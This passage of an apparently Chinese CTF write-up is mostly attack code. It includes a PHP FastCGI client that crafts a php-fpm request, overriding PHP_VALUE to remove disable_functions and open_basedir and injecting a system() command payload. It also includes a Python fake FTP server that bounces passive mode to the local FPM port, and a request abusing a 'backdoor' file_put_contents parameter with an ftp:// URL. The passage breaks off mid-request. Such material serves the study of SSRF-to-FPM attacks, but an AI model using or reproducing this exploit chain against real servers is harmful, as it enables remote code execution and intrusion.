        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
</span><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span> <span class="o">=</span> <span class="nx">stream_socket_client</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_host</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;Unable to connect to FastCGI application&#39;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">buildPacket</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$requestId</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$clen</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">VERSION_1</span><span class="p">)</span>         <span class="cm">/* version */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span>                    <span class="cm">/* type */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$requestId</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="cm">/* requestIdB1 */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$requestId</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>        <span class="cm">/* requestIdB0 */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$clen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>     <span class="cm">/* contentLengthB1 */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$clen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>             <span class="cm">/* contentLengthB0 */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                        <span class="cm">/* paddingLength */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                        <span class="cm">/* reserved */</span>
            <span class="o">.</span> <span class="nv">$content</span><span class="p">;</span>                     <span class="cm">/* content */</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">buildNvpair</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$nlen</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
        <span class="nv">$vlen</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* nameLengthB0 */</span>
            <span class="nv">$nvpair</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$nlen</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="cm">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
            <span class="nv">$nvpair</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$vlen</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* valueLengthB0 */</span>
            <span class="nv">$nvpair</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$vlen</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="cm">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
            <span class="nv">$nvpair</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$vlen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="cm">/* nameData &amp; valueData */</span>
        <span class="k">return</span> <span class="nv">$nvpair</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="nv">$value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">readNvpair</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$length</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$length</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">!=</span> <span class="nv">$length</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$nlen</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">});</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$nlen</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0x7F</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">);</span>
                <span class="nv">$nlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">}));</span>
            <span class="p">}</span>
            <span class="nv">$vlen</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">});</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$vlen</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$vlen</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0x7F</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">);</span>
                <span class="nv">$vlen</span> <span class="o">|=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">}));</span>
            <span class="p">}</span>
            <span class="nv">$array</span><span class="p">[</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$nlen</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$p</span><span class="o">+</span><span class="nv">$nlen</span><span class="p">,</span> <span class="nv">$vlen</span><span class="p">);</span>
            <span class="nv">$p</span> <span class="o">+=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">+</span> <span class="nv">$vlen</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">decodePacketHeader</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;version&#39;</span><span class="p">]</span>       <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span>          <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;requestId&#39;</span><span class="p">]</span>     <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">2</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">3</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;contentLength&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">4</span><span class="p">})</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">5</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;paddingLength&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">6</span><span class="p">});</span>
        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;reserved&#39;</span><span class="p">]</span>      <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">7</span><span class="p">});</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">readPacket</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$packet</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">HEADER_LEN</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$resp</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">decodePacketHeader</span><span class="p">(</span><span class="nv">$packet</span><span class="p">);</span>
            <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;contentLength&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="nv">$len</span>  <span class="o">=</span> <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;contentLength&#39;</span><span class="p">];</span>
                <span class="k">while</span> <span class="p">(</span><span class="nv">$len</span> <span class="o">&amp;&amp;</span> <span class="nv">$buf</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">,</span> <span class="nv">$len</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nv">$len</span> <span class="o">-=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$buf</span><span class="p">);</span>
                    <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$buf</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;paddingLength&#39;</span><span class="p">])</span> <span class="p">{</span>
                <span class="nv">$buf</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">,</span> <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;paddingLength&#39;</span><span class="p">]);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nv">$resp</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getValues</span><span class="p">(</span><span class="k">array</span> <span class="nv">$requestedInfo</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">();</span>
        <span class="nv">$request</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$requestedInfo</span> <span class="k">as</span> <span class="nv">$info</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildNvpair</span><span class="p">(</span><span class="nv">$info</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">GET_VALUES</span><span class="p">,</span> <span class="nv">$request</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
        <span class="nv">$resp</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">readPacket</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nx">self</span><span class="o">::</span><span class="na">GET_VALUES_RESULT</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">readNvpair</span><span class="p">(</span><span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">],</span> <span class="nv">$resp</span><span class="p">[</span><span class="s1">&#39;length&#39;</span><span class="p">]);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;Unexpected response type, expecting GET_VALUES_RESULT&#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">request</span><span class="p">(</span><span class="k">array</span> <span class="nv">$params</span><span class="p">,</span> <span class="nv">$stdin</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$response</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="c1">//        $this-&gt;connect();
</span><span class="c1"></span>        <span class="nv">$request</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">BEGIN_REQUEST</span><span class="p">,</span> <span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">RESPONDER</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_keepAlive</span><span class="p">)</span> <span class="o">.</span> <span class="nx">str_repeat</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mi">5</span><span class="p">));</span>
        <span class="nv">$paramsRequest</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$paramsRequest</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildNvpair</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$paramsRequest</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">PARAMS</span><span class="p">,</span> <span class="nv">$paramsRequest</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">PARAMS</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$stdin</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">STDIN</span><span class="p">,</span> <span class="nv">$stdin</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$request</span> <span class="o">.=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">buildPacket</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">STDIN</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
        <span class="k">echo</span><span class="p">(</span><span class="s1">&#39;?file=ftp://ip:9999/&amp;data=&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="nv">$request</span><span class="p">));</span>

    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span><span class="err">&lt;?php
</span><span class="err">// real exploit start here
</span><span class="err">//if (!isset($_REQUEST[&#39;cmd&#39;])) {
</span><span class="err">//    die(&#34;Check your input\n&#34;);
</span><span class="err">//}
</span><span class="err">//if (!isset($_REQUEST[&#39;filepath&#39;])) {
</span><span class="err">//    $filepath = __FILE__;
</span><span class="err">//}else{
</span><span class="err">//    $filepath = $_REQUEST[&#39;filepath&#39;];
</span><span class="err">//}
</span><span class="err">
</span><span class="err">$filepath = &#34;/var/www/html/add_api.php&#34;;
</span><span class="err">$req = &#39;/&#39;.basename($filepath);
</span><span class="err">$uri = $req .&#39;?&#39;.&#39;command=whoami&#39;;
</span><span class="err">$client = new FCGIClient(&#34;unix:///var/run/php-fpm.sock&#34;, -1);
</span><span class="err">$code = &#34;&lt;?php system(\$_REQUEST[&#39;command&#39;]); phpinfo(); ?&gt;&#34;; // php payload -- Doesnt do anything
</span><span class="err">$php_value = &#34;unserialize_callback_func = system\nextension_dir = /var/www/html\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &#34;; // extension_dir即为.so文件所在目录
</span><span class="err">$params = array(
</span><span class="err">    &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
</span><span class="err">    &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
</span><span class="err">    &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
</span><span class="err">    &#39;SCRIPT_NAME&#39;       =&gt; $req,
</span><span class="err">    &#39;QUERY_STRING&#39;      =&gt; &#39;command=whoami&#39;,
</span><span class="err">    &#39;REQUEST_URI&#39;       =&gt; $uri,
</span><span class="err">    &#39;DOCUMENT_URI&#39;      =&gt; $req,
</span><span class="err">#&#39;DOCUMENT_ROOT&#39;     =&gt; &#39;/&#39;,
</span><span class="err">    &#39;PHP_VALUE&#39;         =&gt; $php_value,
</span><span class="err">    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;80sec/wofeiwo&#39;,
</span><span class="err">    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
</span><span class="err">    &#39;REMOTE_PORT&#39;       =&gt; &#39;9001&#39;, // 找准服务端口
</span><span class="err">    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
</span><span class="err">    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
</span><span class="err">    &#39;SERVER_NAME&#39;       =&gt; &#39;localhost&#39;,
</span><span class="err">    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
</span><span class="err">    &#39;CONTENT_LENGTH&#39;    =&gt; strlen($code)
</span><span class="err">);
</span><span class="err">// print_r($_REQUEST);
</span><span class="err">// print_r($params);
</span><span class="err">//echo &#34;Call: $uri\n\n&#34;;
</span><span class="err">echo $client-&gt;request($params, $code).&#34;\n&#34;;
</span><span class="err">?&gt;
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505184651947.png" alt="image-20210505184651947"></p>
<p>然后在vps上起ftp：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 
<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">12345</span><span class="p">))</span>
<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;220 welcome</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#Service ready for new user.</span>
<span class="c1">#Client send anonymous username</span>
<span class="c1">#USER anonymous</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;331 Please specify the password.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#User name okay, need password.</span>
<span class="c1">#Client send anonymous password.</span>
<span class="c1">#PASS anonymous</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;230 Login successful.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#User logged in, proceed. Logged out if appropriate.</span>
<span class="c1">#TYPE I</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;200 Switching to Binary mode.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#Size /</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;550 Could not get the file size.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#EPSV (1)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;150 ok</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#PASV</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;227 Entering Extended Passive Mode (127,0,0,1,0,9001)</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span> <span class="c1">#STOR / (2) 注意打到9001端口的服务</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;150 Permission denied.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1">#QUIT</span>
<span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;221 Goodbye.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/add_api.php?backdoor<span class="o">=</span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;data&#39;</span><span class="o">]</span><span class="p">;</span>file_put_contents<span class="o">(</span><span class="nv">$file</span>,<span class="nv">$data</span><span class="o">)</span><span class="p">;&amp;</span><span class="nv">file</span><span class="o">=</span>ftp://ip:12345/<span class="p">&amp;</span><span class="nv">data</span><span 